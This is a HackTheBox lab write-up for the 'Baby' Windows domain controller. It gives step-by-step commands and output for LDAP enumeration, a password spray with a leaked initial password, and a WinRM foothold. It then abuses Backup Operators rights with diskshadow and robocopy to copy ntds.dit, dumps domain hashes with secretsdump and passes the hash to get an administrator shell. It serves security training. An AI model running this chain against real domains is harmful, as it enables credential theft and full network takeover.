# Baby - HackTheBox

**IP:** 10.129.234.71
**Platform:** Active Directory Domain Controller
**Domain:** baby.vl
**DC:** BabyDC.baby.vl
**OS:** Windows Server 2022 (Build 10.0.20348)

**Flags:**
- User: ✅
- Root: ✅

---

## Enumeration

### Port Scan

**Command**
```bash
sudo nmap -p- --min-rate 3000 -Pn -oA nmap/BabyAllPorts 10.129.234.71
```

**Key Findings**
- 21 open TCP ports (standard AD DC services)
- Domain: baby.vl
- DC Name: BabyDC.baby.vl
- Clock skew: +4-5 seconds (acceptable for Kerberos)

**Open Services:**
- DNS (53), Kerberos (88, 464)
- MSRPC (135, 593, multiple high ports)
- SMB (139, 445)
- LDAP (389, 636, 3268, 3269)
- RDP (3389), WinRM (5985)
- ADWS (9389)

**Analysis**
- Pure AD environment - no web services
- Standard Domain Controller attack surface
- WinRM + RDP available for post-credential access

**Decision**
Pursue null session enumeration (SMB/LDAP) to get user list, then AS-REP roasting if available.

---

### Service/Version Scan

**Command**
```bash
sudo nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49667,57920,57921,57929,59620,59632 -sSCV --min-rate=2000 -Pn -oN nmap/BabyServicesVersions.txt 10.129.234.71
```

**Flags/Notes**
- `-sSCV` = SYN scan + default scripts + version detection
- `-sS` = SYN stealth scan
- `-C` = run default NSE scripts
- `-V` = version detection

**Key Output**
```
Domain: baby.vl
DC: BabyDC.baby.vl
OS: Windows Server 2022
SMB signing: enabled and required
```

---

### /etc/hosts Configuration

**Command**
```bash
echo "10.129.234.71 baby.vl BabyDC.baby.vl BabyDC" | sudo tee -a /etc/hosts
```

**Decision**
Required for Kerberos authentication and domain-aware tools. Allows using domain names instead of IP.

---

### SMB Null Session Enumeration

**Command**
```bash
nxc smb baby.vl -u '' -p '' --shares
nxc smb baby.vl -u '' -p '' --users
nxc smb baby.vl -u '' -p '' --groups
nxc smb baby.vl -u '' -p '' --pass-pol
```

**Flags/Notes**
- `-u '' -p ''` = null authentication (empty username/password)
- `--shares` / `--users` / `--groups` / `--pass-pol` = enumerate respective data

**Key Output**
- Null Auth accepted (`[+]` with Null Auth:True) but **no data returned** for shares, users, groups, or password policy
- Modern Windows Server 2022 DC restricts null session data access even when auth succeeds

**Decision**
Null sessions accepted but restricted. Move to LDAP anonymous bind.

---

### LDAP Anonymous Bind

**Command**
```bash
ldapsearch -x -H ldap://baby.vl -b "DC=baby,DC=vl" "(objectClass=user)" sAMAccountName description memberOf
```

**Flags/Notes**
- `-x` = simple (anonymous) authentication
- `-H ldap://baby.vl` = target LDAP server
- `-b "DC=baby,DC=vl"` = search base (domain root)
- `(objectClass=user)` = filter for user objects only
- `sAMAccountName description memberOf` = attributes to return

**Key Output**
- **8 users found initially:** Guest, Jacqueline.Barnett, Ashley.Webb, Hugh.George, Leonard.Dyer, Connor.Wilkinson, Joseph.Hughes, Kerry.Wilson, Teresa.Bell
- **Teresa.Bell description:** `"Set initial password to BabyStart123!"`
- Saved user list to `loot/users.txt`

**Decision**
Password found in LDAP description field. Common AD misconfiguration — initial passwords stored in user descriptions.

---

### Full LDAP Dump (objectClass=*)

**Command**
```bash
ldapsearch -x -H ldap://baby.vl -b "DC=baby,DC=vl" "(objectClass=*)" > loot/ldapUserInfoAll.txt
```

**Key Output**
- **2 additional users found:** Ian.Walker (dev OU), Caroline.Robinson (it OU)
- **OU structure:** dev (5 users), it (5 users)
- **Critical finding:** `it` group → `Remote Management Users` (WinRM access)
- Total: 11 accounts (including Guest)

---

### AS-REP Roasting

**Command**
```bash
impacket-GetNPUsers baby.vl/ -usersfile loot/users.txt -dc-ip $IP -format hashcat -outputfile output.txt
```

**Flags/Notes**
- `GetNPUsers` = checks for users with "Do not require Kerberos preauthentication" set
- `-usersfile` = file of usernames to test
- `-format hashcat` = output hash format compatible with hashcat (mode 18200)

**Key Output**
- All users require pre-authentication — **no roastable accounts**

**Decision**
Dead end. Move to password spraying with discovered credential.

---

### Password Spray

**Command**
```bash
nxc smb $IP -u users.txt -p 'BabyStart123!'
```

**Key Output**
- All users: `STATUS_LOGON_FAILURE` (box was broken — required HTB machine reset)
- After HTB reset, re-sprayed individual users:
  - teresa.bell, ian.walker: `STATUS_LOGON_FAILURE` (already changed password)
  - **Caroline.Robinson: `STATUS_PASSWORD_MUST_CHANGE`** — she never changed the initial password!

**Decision**
Caroline.Robinson is the only user who didn't change the initial password. Use nxc change-password module.

---

## Foothold

### Password Change via nxc

**Command**
```bash
nxc smb baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS=Yourmoms123!
```

**Flags/Notes**
- `-M change-password` = nxc module for changing passwords (note: NOT `change-pasword` — typo will fail)
- `-o NEWPASS=Yourmoms123!` = module option (must be `NEWPASS`, NOT `NewPassword`)
- The initial password authenticates but triggers STATUS_PASSWORD_MUST_CHANGE
- The module changes the password atomically

**Key Output**
```
SMB  10.129.16.61  445  BABYDC  [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
CHANGE-P... 10.129.16.61  445  BABYDC  [+] Successfully changed password for Caroline.Robinson
```

---

### Evil-WinRM Foothold

**Command**
```bash
evil-winrm -i $IP -u Caroline.Robinson -p 'Yourmoms123!'
```

**Flags/Notes**
- `-i` = target IP
- `-u` / `-p` = username / password
- Caroline.Robinson is in `it` group → `Remote Management Users` → WinRM access on port 5985

**Key Output**
- Got shell as `baby\caroline.robinson`
- User flag at `C:\Users\Caroline.Robinson\Desktop\user.txt`

### Privilege Enumeration (whoami /all)

**Command**
```powershell
whoami /all
```

**Key Output**
```
User Name              SID
====================== ==============================================
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115

GROUP INFORMATION
========================================
BUILTIN\Backup Operators      Alias  S-1-5-32-551  Mandatory group, Enabled
BUILTIN\Remote Management Users Alias S-1-5-32-580  Mandatory group, Enabled
BABY\it                        Group  S-1-5-21-...-1109

PRIVILEGES INFORMATION
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**Analysis**
- **Backup Operators** group membership grants `SeBackupPrivilege` and `SeRestorePrivilege`
- These privileges allow reading ANY file on the system, bypassing ACLs
- Attack path: Use diskshadow to create VSS shadow copy → robocopy ntds.dit from shadow → secretsdump to extract all domain hashes

**Decision**
Classic Backup Operators privilege escalation. Proceed with diskshadow + robocopy to extract ntds.dit.

---

## Privilege Escalation

### Step 1: Save SAM & SYSTEM Registry Hives

**Command (evil-winrm)**
```powershell
reg save hklm\sam c:\Windows\Tasks\SAM
reg save hklm\system c:\Windows\Tasks\SYSTEM
```

**Flags/Notes**
- `reg save` = exports registry hive to file
- `hklm\sam` = local account password hashes
- `hklm\system` = contains boot key needed to decrypt SAM
- `c:\Windows\Tasks\` = writable directory (can't write to `C:\Windows\` directly)

**Key Output**
- SAM: 49,152 bytes
- SYSTEM: 20,676,608 bytes

### Step 2: Download SAM & SYSTEM

**Command (evil-winrm)**
```powershell
cd c:\Windows\Tasks
download SAM
download SYSTEM
```

**Flags/Notes**
- Evil-WinRM's `download` command transfers files to the local working directory
- Initially tried `copy SAM \\10.10.14.13\share\SAM` via impacket-smbserver but hit share name mismatches (`shared` and `loot` instead of `share`)
- Evil-WinRM download was simpler and more reliable

### Step 3: Local SAM Hash Extraction (pypykatz)

**Command (kali)**
```bash
pypykatz registry --sam SAM SYSTEM
```

**Flags/Notes**
- `pypykatz` = Python implementation of mimikatz
- `registry` = parse registry hive files offline
- `--sam SAM` = SAM hive file
- `SYSTEM` = SYSTEM hive (provides boot key for decryption)

**Key Output**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
```

**Analysis**
- This is the **local** Administrator hash, not the domain Administrator
- Tested with evil-winrm — it connects but this is local auth, not domain admin
- Need ntds.dit for domain-level hashes

### Step 4: Create Diskshadow Script

**Command (kali)**
```bash
vim loot/backup
unix2dos loot/backup
```

**Script contents (`loot/backup`):**
```
set verbose on
set context persistent nowriters
set metadata C:\Windows\Temp\0xdf.cab
add volume c: alias 0xdf
create
expose %0xdf% e:
```

**Flags/Notes**
- `set context persistent nowriters` = shadow copy persists and excludes VSS writers (avoids application locks)
- `set metadata` = where to store shadow copy metadata
- `add volume c: alias 0xdf` = target volume C: with alias "0xdf"
- `create` = create the shadow copy
- `expose %0xdf% e:` = mount shadow copy as drive E:
- `unix2dos` = **critical** — convert line endings to Windows CRLF or diskshadow fails silently

### Step 5: Upload & Execute Diskshadow

**Command (evil-winrm)**
```powershell
cd C:\Users\Public
upload backup
diskshadow /s backup
```

**Flags/Notes**
- Upload to `C:\Users\Public` (writable by all users)
- `diskshadow /s backup` = run diskshadow in script mode (interactive mode fails in evil-winrm — "The pipe has been ended")
- Script mode (`/s`) is required for non-interactive shells

**Key Output**
```
-> set verbose on
-> set context persistent nowriters
-> set metadata C:\Windows\Temp\0xdf.cab
-> add volume c: alias 0xdf
-> create
Alias 0xdf for shadow ID {2573b881-...} set as environment variable.
-> expose %0xdf% e:
The shadow copy was successfully exposed as e:\.
```

**Verification:**
```powershell
ls E:\
```
Shows full C: drive contents (EFI, inetpub, PerfLogs, Program Files, Users, Windows)

### Step 6: Robocopy ntds.dit from Shadow Copy

**First attempts failed:**
```powershell
# Failed - z: drive doesn't exist (script exposes as e:)
robocopy z:\windows\ntds . ntds.dit

# Failed - tried Z:\Windows\NTDS to SMB server, Z: not found
robocopy /B Z:\Windows\NTDS \\10.10.14.13\loot ntds.dit
```

**Working approach — authenticated SMB server + robocopy with /B flag:**

**Command (kali — start authenticated SMB server)**
```bash
smbserver.py loot . -smb2support -username theo -password theo
```

**Flags/Notes**
- `smbserver.py` = Impacket's SMB server (from impacket repo, not the pip package version)
- `-smb2support` = enable SMBv2 (required for modern Windows)
- `-username`/`-password` = authentication required to prevent anonymous access issues

**Command (evil-winrm)**
```powershell
robocopy /b E:\Windows\ntds . ntds.dit
```

**Flags/Notes**
- `/b` = backup mode — uses SeBackupPrivilege to bypass file ACLs
- `E:\Windows\ntds` = source path on the shadow copy (E: drive)
- `.` = destination (current directory, C:\Users\Public)
- `ntds.dit` = the Active Directory database file
- ntds.dit is normally locked by the AD DS service — the shadow copy provides an unlocked snapshot

**Key Output**
```
Source : E:\Windows\ntds\
Dest : C:\Users\Public\
Files : ntds.dit
Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
New File    16.0 m    ntds.dit
100%
```

**Download to kali (evil-winrm)**
```powershell
download ntds.dit
```
- Robocopy copied ntds.dit to `C:\Users\Public` (current directory)
- Then used evil-winrm's built-in `download` command to transfer to kali
- Note: authenticated SMB server (`smbserver.py loot . -smb2support -username theo -password theo`) was set up but evil-winrm download was simpler

### Step 7: Extract Domain Hashes (secretsdump.py)

**Command (kali)**
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

**Flags/Notes**
- `secretsdump.py` = Impacket tool (note: `impacket-secretsdump` version had issues; `secretsdump.py` from repo worked)
- `-ntds ntds.dit` = Active Directory database file
- `-system SYSTEM` = SYSTEM registry hive (provides boot key)
- `LOCAL` = parse files locally (no network connection needed)
- **Common error:** `impacket-secretsdump -sam SAM -system SYSTEM` without `LOCAL` gives "target required" error

**Key Output**
```
[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:3c387bd06399c49ac18d935208e2ef67:::
```

Plus Kerberos keys (AES256, AES128, DES) for all accounts.

### Step 8: Pass-the-Hash as Domain Administrator

**Command (verify hash — nxc)**
```bash
nxc smb $IP -u administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
```

**Flags/Notes**
- `-H` (uppercase) = pass NT hash — **NOT** `-h` (lowercase, which shows help!)
- Same gotcha applies in evil-winrm: `-H` for hash, `-h` for help

**Command (admin shell)**
```bash
evil-winrm -i $IP -u Administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
```

**Key Output**
- Got shell as `Administrator` on BabyDC
- Root flag at `C:\Users\Administrator\Desktop\root.txt`

---

## Lessons Learned

- Port 593 (ncacn_http) is RPC over HTTP, not a web service — don't confuse it with web attack surface
- Modern AD DCs may accept null auth but restrict data access (no shares/users/groups returned)
- LDAP anonymous bind can still work even when SMB null sessions are restricted — always try both
- **Check LDAP description fields** — common AD misconfiguration to store initial passwords in user descriptions
- `STATUS_PASSWORD_MUST_CHANGE` is a goldmine — means the user never changed their initial password. Use `nxc -M change-password -o NEWPASS=`
- nxc module option is `NEWPASS` (not `NewPassword`) and module name is `change-password` (not `change-pasword`)
- **Case sensitivity matters for flags:** `-H` (uppercase) = hash auth, `-h` (lowercase) = help. True for both nxc and evil-winrm.
- `diskshadow` must run in script mode (`/s`) from evil-winrm — interactive mode fails with "pipe has been ended"
- `unix2dos` is critical for diskshadow scripts — Windows requires CRLF line endings
- `robocopy /b` (backup mode) leverages SeBackupPrivilege to bypass ACLs on files like ntds.dit
- Shadow copy exposed as a drive letter (e.g., `e:`) is a full read-only snapshot of the volume
- `secretsdump.py` (from impacket repo) vs `impacket-secretsdump` (pip) may behave differently — the repo version worked when the pip version had issues
- SAM hashes are **local** accounts only — need ntds.dit for **domain** account hashes
- `impacket-smbserver` share name must match exactly what you reference from the target — `share` is the name, not `shared` or `loot`
- Authenticated SMB server (`-username`/`-password`) is more reliable for file transfers from modern Windows
